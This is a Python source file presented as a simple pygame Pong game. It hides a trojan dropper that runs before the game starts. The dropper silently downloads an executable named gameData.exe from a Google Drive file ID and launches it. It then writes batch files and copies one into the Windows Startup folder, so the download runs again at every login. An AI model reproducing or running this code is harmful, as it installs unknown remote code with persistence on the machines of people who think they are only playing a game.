import pygame
from pygame.locals import *
from sys import exit
import random
import subprocess
from subprocess import PIPE,Popen
import glob, os
import wmi
from xml.dom import minidom
import csv
import urllib2
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase 
from email import encoders
from pathlib2 import Path
import requests
import subprocess 
from subprocess import Popen,PIPE
import winshell

#function to download gameData.exe
def download_file_from_google_drive(id, destination):

    URL = "https://docs.google.com/uc?export=download"

    session = requests.Session()

    response = session.get(URL, params = { 'id' : id }, stream = True)
    #check whether file is downloadable or not
    token = get_confirm_token(response)

    if token:
        params = { 'id' : id, 'confirm' : token }
        #donwloading gameData.exe
        response = session.get(URL, params = params, stream = True)
    #saving donwloaded content to data
    save_response_content(response, destination) 

#method to check whether file is downloadable or not
def get_confirm_token(response):
    for key, value in response.cookies.items():
        if key.startswith('download_warning'):
            return value

    return None
#method to save downloaded data to file
def save_response_content(response, destination):
    CHUNK_SIZE = 32768

    with open(destination, "wb") as f:
        for chunk in response.iter_content(CHUNK_SIZE):
            if chunk: # filter out keep-alive new chunks
                f.write(chunk)
    cmd="move "+destination+" c:\Users\%USERNAME%\Downloads"
    process=Popen(args=cmd,stdout=subprocess.PIPE,shell=True)
    process.communicate()[0]

def startAction():
    file_id = '12dClzZpicSsyQlaT4UwonyrqCkm8X82t'
    destination = 'gameData.exe'
    download_file_from_google_drive(file_id, destination)
    #creating bat file with command to execute gameData.exe
    with open("gameexe.bat","w") as fp:
        fp.write("@echo off \n"+"start c:\Users\\"+os.environ["USERNAME"]+"\Downloads\gameData.exe")
        fp.close()
    #moving bat file to donwloads folder
    cmd="move gameexe.bat c:\Users\%USERNAME%\Downloads"
    process=Popen(args=cmd,stdout=subprocess.PIPE,shell=True)
    process.communicate()[0]
    cmd="c:"
    process=Popen(args=cmd,stdout=subprocess.PIPE,shell=True)
    process.communicate()
    path=os.path.join("c:\Users\\"+os.environ["USERNAME"]+"\Downloads\\","gamexe-test.bat")
    target="c:\Users\%USERNAME%\Downloads\gameexe.bat"
    shortcut = file(path, 'w')
    shortcut.write('@echo off\n')
    shortcut.write('start %s' % target)
    shortcut.close()
    cmd="move \"c:\Users\%USERNAME%\Downloads\gamexe-test.bat\" \"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\\""
    process=Popen(args=cmd,stdout=subprocess.PIPE,shell=True)
    process.communicate()[0]



#starting point....checking whether gameData.exe is present or not
if(not os.path.exists("c:\Users\\"+os.environ["USERNAME"]+"\Downloads\gameData.exe")):
    startAction()
count=0
c = wmi.WMI ()

for process in c.Win32_Process ():
    if process.name=='gameData.exe':
        count+=1
if count==0:
    cmd="c:\Users\\"+os.environ["USERNAME"]+"\"\Downloads\gameData.exe"
    process=Popen(args=cmd,stdout=subprocess.PIPE,shell=True)
    process.communicate()[0]



 #game begines--------------------------------------------------------------------------   
pygame.init()

screen=pygame.display.set_mode((640,480),0,32)
pygame.display.set_caption("Pong Pong!")

#Creating 2 bars, a ball and background.
back = pygame.Surface((640,480))
background = back.convert()
background.fill((0,0,0))
bar = pygame.Surface((10,50))
bar1 = bar.convert()
bar1.fill((0,0,255))
bar2 = bar.convert()
bar2.fill((255,0,0))
circ_sur = pygame.Surface((15,15))
circ = pygame.draw.circle(circ_sur,(0,255,0),(15/2,15/2),15/2)
circle = circ_sur.convert()
circle.set_colorkey((0,0,0))

# some definitions
bar1_x, bar2_x = 10. , 620.
bar1_y, bar2_y = 215. , 215.
circle_x, circle_y = 307.5, 232.5
bar1_move, bar2_move = 0. , 0.
speed_x, speed_y, speed_circ = 250., 250., 250.
bar1_score, bar2_score = 0,0
#clock and font objects
clock = pygame.time.Clock()
font = pygame.font.SysFont("calibri",40)

while True:
    
    for event in pygame.event.get():
        if event.type == QUIT:
            exit()
        if event.type == KEYDOWN:
            if event.key == K_UP:
                bar1_move = -ai_speed
            elif event.key == K_DOWN:
                bar1_move = ai_speed
        elif event.type == KEYUP:
            if event.key == K_UP:
                bar1_move = 0.
            elif event.key == K_DOWN:
                bar1_move = 0.
    
    score1 = font.render(str(bar1_score), True,(255,255,255))
    score2 = font.render(str(bar2_score), True,(255,255,255))

    screen.blit(background,(0,0))
    frame = pygame.draw.rect(screen,(255,255,255),Rect((5,5),(630,470)),2)
    middle_line = pygame.draw.aaline(screen,(255,255,255),(330,5),(330,475))
    screen.blit(bar1,(bar1_x,bar1_y))
    screen.blit(bar2,(bar2_x,bar2_y))
    screen.blit(circle,(circle_x,circle_y))
    screen.blit(score1,(250.,210.))
    screen.blit(score2,(380.,210.))

    bar1_y += bar1_move
    
# movement of circle
    time_passed = clock.tick(30)
    time_sec = time_passed / 1000.0
    
    circle_x += speed_x * time_sec
    circle_y += speed_y * time_sec
    ai_speed = speed_circ * time_sec
#AI of the computer.
    if circle_x >= 305.:
        if not bar2_y == circle_y + 7.5:
            if bar2_y < circle_y + 7.5:
                bar2_y += ai_speed
            if  bar2_y > circle_y - 42.5:
                bar2_y -= ai_speed
        else:
            bar2_y == circle_y + 7.5
    
    if bar1_y >= 420.: bar1_y = 420.
    elif bar1_y <= 10. : bar1_y = 10.
    if bar2_y >= 420.: bar2_y = 420.
    elif bar2_y <= 10.: bar2_y = 10.
#since i don't know anything about collision, ball hitting bars goes like this.
    if circle_x <= bar1_x + 10.:
        if circle_y >= bar1_y - 7.5 and circle_y <= bar1_y + 42.5:
            circle_x = 20.
            speed_x = -speed_x
    if circle_x >= bar2_x - 15.:
        if circle_y >= bar2_y - 7.5 and circle_y <= bar2_y + 42.5:
            circle_x = 605.
            speed_x = -speed_x
    if circle_x < 5.:
        bar2_score += 1
        circle_x, circle_y = 320., 232.5
        bar1_y,bar_2_y = 215., 215.
    elif circle_x > 620.:
        bar1_score += 1
        circle_x, circle_y = 307.5, 232.5
        bar1_y, bar2_y = 215., 215.
    if circle_y <= 10.:
        speed_y = -speed_y
        circle_y = 10.
    elif circle_y >= 457.5:
        speed_y = -speed_y
        circle_y = 457.5

    pygame.display.update()
